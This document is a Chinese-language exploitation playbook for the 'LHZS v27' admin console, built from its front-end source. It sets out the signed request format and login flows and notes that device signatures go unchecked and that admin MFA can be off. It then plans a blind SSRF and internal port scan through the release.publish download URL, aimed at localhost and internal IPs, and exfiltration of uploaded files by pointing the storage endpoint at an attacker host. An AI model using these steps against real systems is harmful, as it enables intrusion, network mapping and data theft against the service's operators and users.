# LHZS v27 管理台：认证链协议 + 全部 action 字段 + SSRF/落盘可控点

来源：管理台前端源码 `admin_js/*.js`（**代码原文，非猜测**；APK 侧拿不到 —— 见文末"为什么"）
提取角色：exploit

════════════════════════════════════════
## 一、请求信封（所有 v27 请求）

```javascript
// api.js send()
const url = new URL(path, this.base);            // base = new URL('../v27/', import.meta.url)
const body = method === 'GET' ? '' : JSON.stringify(data || {});
// 约束：url.search 必须为空（不带 query string）；body ≤ 16384 字节；redirect:'error'; credentials:'omit'
headers = {
  'Content-Type': 'application/json',
  'X-Security-Version': '2',
  'X-Timestamp':  String(Date.now()),
  'X-Nonce':      randomId(),
  'X-Request-Id': randomId(),
  'X-Session-Id': sessionId,                     // 未登录时为空
  'X-Device-Signature': base64url(DER(ECDSA-P256-SHA256(canonical))),
  ...(bearer ? {Authorization: `Bearer ${credential}`} : {})
}
// canonical（\n 连接，10 段）
['LHZSV2', method, url.pathname, sha256(''), sha256(body), timestamp, nonce, requestId, sessionId, sha256(credential)].join('\n')
```
公钥格式：`base64url(crypto.subtle.exportKey('spki', keyPair.publicKey))`（ECDSA P-256，SPKI DER，base64url 无 padding）

响应：`{ok:true, data:{...}}`（取 `result.data`）；失败 `{ok:false, code:'^[A-Za-z0-9_]{1,80}$'}`
**已实测：`auth/password/finish` 服务端不校验设备签名 ⇒ 字段名对即可，签名可省。**

════════════════════════════════════════
## 二、认证链（精确字段）

### 2.1 普通登录
```
POST /v27/auth/password/start
  {"username":"<账号>","publicKey":"<base64url SPKI ECDSA P-256>"}
  -> {"ok":true,"data":{"challengeId":"..."}}

POST /v27/auth/password/finish
  X-Session-Id: <challengeId>
  {"username":"<账号>","password":"<明文口令>","publicKey":"<与上一步完全一致>","challengeId":"<同上>"}
  -> {"ok":true,"data":{"userId","sessionId","accessToken","refreshToken","accessExpiresIn"}}
```

### 2.2 管理员登录（MFA 可关）
```
POST /v27/auth/admin/start
  {"username":"<管理员>","publicKey":"<...>"}
  -> {"ok":true,"data":{"challengeId":"...","mfaRequired":<true|false>}}

POST /v27/auth/admin/finish
  X-Session-Id: <challengeId>
  {"username","password","publicKey","challengeId"}     // 仅 mfaRequired!==false 时再加 "factorCode":"<6位数字，^[0-9]{6}$>"
  -> 必须满足 result.purpose==='admin' && result.sessionId && result.accessToken
     成功字段：{purpose:"admin", sessionId, accessToken, refreshToken, accessExpiresIn, mfaRequired}
```
★ 关键判定（原文注释）：`mfaRequired = (start.mfaRequired !== false)`
⇒ **只有服务端显式返回 `"mfaRequired": false` 才走"纯密码登录"**；字段缺失 = 旧协议 = MFA-only。

### 2.3 刷新 / 登出 / 二次验证
```
POST /v27/auth/refresh        {"refreshToken":"<...>"}   headers: X-Session-Id:<sessionId>, Authorization: Bearer <refreshToken>
POST /v27/auth/logout          {}          （普通用户）
POST /v27/auth/admin/logout    {}          （管理员）
POST /v27/auth/admin/step-up/start    body = {action, payload:"<JSON字符串>", operationId}
                                       -> {challengeId, mfaRequired}
POST /v27/auth/admin/step-up/finish   {challengeId[, factorCode]}  -> {stepUpToken}
POST /v27/auth/admin/verification/send    -> {sendRequestId, deliveryId, submissionState, factorState, generation, sent, expiresIn, retryAfterSeconds}
POST /v27/auth/admin/verification/status
POST /v27/auth/admin/account-command
```

### 2.4 业务统一入口
```javascript
call(area, kind, action, payload={}, operationId='') {
  // area ∈ ['admin','chat']，kind ∈ ['query','command']
  return this.request(`${area}/${kind}`, {action, payload: JSON.stringify(payload), operationId});
}
```
⇒ body：`{"action":"<动作名>","payload":"<JSON 字符串>","operationId":"<ID>"}`
⇒ 写操作额外头：`X-Step-Up-Token`（step-up 令牌）、`X-Action-Permit`

错误码：`SESSION_CHANGED, INVALID_RESPONSE, NETWORK_UNCERTAIN, VERIFICATION_REQUIRED(428), RATE_LIMITED(429), DATA_QUERY_RATE_LIMITED, ADMIN_FACTOR_REQUIRED, ADMIN_PURPOSE_REQUIRED(403), ADMIN_AUTH_MODE_CHANGED(403), ADMIN_LOGIN_REQUIRED(401), ADMIN_REAUTH_REQUIRED(401), LOGIN_REQUIRED(401), STEPUP_PENDING(403), VERIFICATION_FAILED, CHALLENGE_EXPIRED, VERIFICATION_ALREADY_USED, PERMIT_INVALID`

════════════════════════════════════════
## 三、★★★ SSRF 跳板：`release.publish`

来源 `app-release.js`（原文）
```javascript
action('发布新版本','release.publish',{},[
  field('versionCode', ...), field('versionName', ...),
  field('downloadUrl','APK 下载地址',{type:'url',maxlength:500,
        help:'必须是能直接下载安装包的链接，不能是网页。服务器会下载一次校验并记录指纹。'}),   // ★ 服务端主动下载
  field('notes', ...), field('forceUpdate',{value:'false'}), field('minSupported',{value:'0'})
],'提交后服务器会下载一次安装包做校验（可能需要一分钟），校验通过才会发布。')
```
action：`release.list`(q) `release.publish`(c) `release.withdraw`(c) `release.manual.publish`(c) `release.manual.withdraw`(c)
`release.withdraw` / `release.manual.withdraw` payload：`{id}`
`release.manual.publish` payload：`{versionCode, versionName, downloadUrl}`

**SSRF 侧信道（错误码区分目标状态）**
```
package_not_apk            下载成功但不是 APK        -> 目标可达、返回了内容
package_signature_invalid  下载到了东西但签名无效
package_signer_mismatch / package_name_mismatch / package_version_mismatch / package_debuggable / package_android_incompatible
release_policy_unconfigured 服务端未配可信发布证书（该功能可能整体不可用）
```
⇒ 把 `downloadUrl` 指向 `http://127.0.0.1:8080/manager/html`、`http://127.0.0.1:8080/`、
   内网 `203.0.113.17:8080/LHService/fenleilist`、`203.0.113.11:80`、`203.0.113.57:443` 等，
   由错误码判断"可达/不可达/是否 Web 内容" ⇒ **盲 SSRF + 内网端口探测**。

════════════════════════════════════════
## 四、★★★ 落盘/存储可控：`storage.configure`

来源 `example.com`（原文）
```javascript
await query('storage.list');
action('保存新的 OSS 配置','storage.configure',{credentialSource:'ACCESS_KEY'},[
  field('region',         {placeholder:'cn-hangzhou',                       maxlength:40}),
  field('endpoint',       {placeholder:'https://target341.example.com',maxlength:160}),  // ★ 可控 endpoint
  field('bucket',         {maxlength:63}),
  field('prefix',         {placeholder:'chat/v27/',                        maxlength:200}),  // ★ 目录前缀
  field('accessKeyId',    {maxlength:128}),
  field('accessKeySecret',{type:'password',maxlength:256,help:'只在本次请求内发送；保存后不回显。主密钥由服务器单独配置。'})
])
action('测试存储配置','storage.test',{version}) / action('启用存储配置','storage.activate',{version})
```
action：`storage.list`(q) `storage.configure`(c) `storage.test`(c,`{version}`) `storage.activate`(c,`{version}`) `storage.bootstrap`
`storage.accounts.list`(q) / `storage.accounts.save`(c) / `storage.accounts.read`
`storage.accounts.save` 字段（`routing.js`）：`name, accountNote, enabled, accessKeyId, accessKeySecret`
`routing.save` 字段（`routing.js`）：`name, site, account, editUrl`
`routing.publish.retry` 字段：`{publicationId, reason}`

⇒ `endpoint` 可控 ⇒ 服务端把新上传文件推到攻击者指定的 S3/OSS 兼容地址（**数据外带 + SSRF**）
⇒ `prefix` 可控 ⇒ 落盘目录可控；`bucket/accessKey*` 可填任意 ⇒ 用攻击者凭证上传

